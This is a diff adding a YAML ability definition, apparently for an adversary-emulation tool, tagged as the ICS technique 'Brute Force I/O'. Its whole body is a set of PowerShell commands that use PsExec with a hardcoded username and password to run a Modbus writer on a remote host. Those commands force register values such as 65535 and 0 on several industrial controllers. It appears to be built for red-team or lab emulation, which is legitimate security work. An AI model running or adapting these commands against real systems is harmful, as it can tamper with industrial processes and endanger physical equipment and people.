@@ -1,0 +1,19 @@
+- id: tx2_lateral_exec_attack_tool
+  name: TX2_Lateral_Exec_Attack_Tool
+  description: Execute multiple register write commands remotely via PsExec using PowerShell.
+  tactic: Impair Process Control
+  technique:
+    attack_id: T0806
+    name: Brute Force I/O
+  platforms:
+    windows:
+      psh:
+        command: |
+          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.17.24.12', '-u', 'txone', '-p', 'tx1otexerc', '-d', '-realtime', 'C:\Windows\Temp\modbus_writer.exe', '-ip', '192.168.95.2', '-reg', '1026', '-cmd', 'write_register', '-val', '65535', '-period', '1', '-count', '1' -NoNewWindow;
+          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.17.24.12', '-u', 'txone', '-p', 'tx1otexerc', '-d', '-realtime', 'C:\Windows\Temp\modbus_writer.exe', '-ip', '192.168.95.2', '-reg', '1025', '-cmd', 'write_register', '-val', '65535', '-period', '1', '-count', '1' -NoNewWindow;
+          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.17.24.12', '-u', 'txone', '-p', 'tx1otexerc', '-d', '-realtime', 'C:\Windows\Temp\modbus_writer.exe', '-ip', '192.168.95.12', '-reg', '1', '-cmd', 'write_register', '-val', '0', '-period', '1' -NoNewWindow;
+          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.17.24.12', '-u', 'txone', '-p', 'tx1otexerc', '-d', '-realtime', 'C:\Windows\Temp\modbus_writer.exe', '-ip', '192.168.95.13', '-reg', '1', '-cmd', 'write_register', '-val', '0', '-period', '1' -NoNewWindow;
+          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.17.24.12', '-u', 'txone', '-p', 'tx1otexerc', '-d', '-realtime', 'C:\Windows\Temp\modbus_writer.exe', '-ip', '192.168.95.10', '-reg', '1', '-cmd', 'write_register', '-val', '65535', '-period', '1' -NoNewWindow;
+          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.17.24.12', '-u', 'txone', '-p', 'tx1otexerc', '-d', '-realtime', 'C:\Windows\Temp\modbus_writer.exe', '-ip', '192.168.95.11', '-reg', '1', '-cmd', 'write_register', '-val', '65535', '-period', '1' -NoNewWindow
+        payloads:
+          - psexec.exe
